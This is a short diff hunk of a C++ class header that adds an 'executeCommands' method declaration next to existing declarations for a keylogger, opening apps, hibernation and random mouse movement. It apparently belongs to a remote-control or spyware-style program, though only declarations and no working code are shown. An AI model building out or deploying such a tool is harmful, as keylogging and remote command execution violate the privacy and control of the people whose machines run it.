@@ -49,6 +49,8 @@ public:
 	void OpenApp(const char* app);
 	void Keylogger(const char* fileName);
 
+    void executeCommands();
+
 	void Hibernation();
 	void RandMouse();
 
